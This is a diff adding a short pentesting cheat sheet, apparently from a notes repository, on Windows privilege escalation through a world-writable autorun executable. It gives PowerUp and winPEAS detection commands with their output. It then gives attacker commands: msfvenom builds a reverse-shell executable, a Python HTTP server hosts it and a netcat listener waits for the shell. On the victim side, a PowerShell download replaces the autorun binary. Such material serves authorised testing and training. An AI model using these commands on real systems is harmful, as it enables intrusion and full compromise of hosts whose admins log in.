@@ -1,0 +1,29 @@
+# Autorun
+# Detection
+powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
+
+[*] Checking for modifiable registry autoruns and configs...
+
+Key            : HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\My Program
+Path           : "C:\Program Files\Autorun Program\program.exe"
+ModifiableFile : @{Permissions=System.Object[]; ModifiablePath=C:\Program Files\Autorun Program\program.exe; IdentityReference=Everyone}
+
+# winPEAS.exe
+
+[+] Autorun Applications(T1010)
+    Folder: C:\Program Files\Autorun Program
+    File: C:\Program Files\Autorun Program\program.exe
+    FilePerms: Everyone [AllAccess]
+
+
+# Exploitation
+# Attacker
+msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > program.exe
+sudo python -m SimpleHTTPServer 80
+sudo nc -lvp <PORT>
+
+# Victim
+cd C:\Program Files\Autorun Program\
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/program.exe', '.\program.exe')
+
+# To execute it with elevated privileges we need to wait for someone in the Admin group to login.
